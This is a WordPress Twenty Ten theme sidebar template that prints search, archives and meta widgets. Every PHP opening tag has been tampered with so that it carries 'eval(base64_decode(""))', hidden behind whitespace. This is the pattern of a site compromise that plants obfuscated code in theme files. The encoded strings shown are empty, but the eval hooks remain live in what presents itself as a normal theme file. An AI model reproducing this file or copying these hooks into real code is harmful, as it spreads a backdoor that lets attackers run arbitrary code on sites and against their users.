<?php	 	eval(base64_decode(""));
/**
 * The Sidebar containing the primary and secondary widget areas.
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */
?>

		<div id="primary" class="widget-area" role="complementary">
			<ul class="xoxo">

<?php	 	eval(base64_decode(""));
	/* When we call the dynamic_sidebar() function, it'll spit out
	 * the widgets for that widget area. If it instead returns false,
	 * then the sidebar simply doesn't exist, so we'll hard-code in
	 * some default sidebar stuff just in case.
	 */
	if ( ! dynamic_sidebar( 'primary-widget-area' ) ) : ?>
	
			<li id="search" class="widget-container widget_search">
				<?php	 	eval(base64_decode("")); get_search_form(); ?>
			</li>

			<li id="archives" class="widget-container">
				<h3 class="widget-title"><?php	 	eval(base64_decode("")); _e( 'Archives', 'twentyten' ); ?></h3>
				<ul>
					<?php	 	eval(base64_decode("")); wp_get_archives( 'type=monthly' ); ?>
				</ul>
			</li>

			<li id="meta" class="widget-container">
				<h3 class="widget-title"><?php	 	eval(base64_decode("")); _e( 'Meta', 'twentyten' ); ?></h3>
				<ul>
					<?php	 	eval(base64_decode("")); wp_register(); ?>
					<li><?php	 	eval(base64_decode("")); wp_loginout(); ?></li>
					<?php	 	eval(base64_decode("")); wp_meta(); ?>
				</ul>
			</li>

		<?php	 	eval(base64_decode("")); endif; // end primary widget area ?>
			</ul>
		</div><!-- #primary .widget-area -->

<?php	 	eval(base64_decode(""));
	// A second sidebar for widgets, just because.
	if ( is_active_sidebar( 'secondary-widget-area' ) ) : ?>

		<div id="secondary" class="widget-area" role="complementary">
			<ul class="xoxo">
				<?php	 	eval(base64_decode("")); dynamic_sidebar( 'secondary-widget-area' ); ?>
			</ul>
		</div><!-- #secondary .widget-area -->

<?php	 	eval(base64_decode("")); endif; ?>
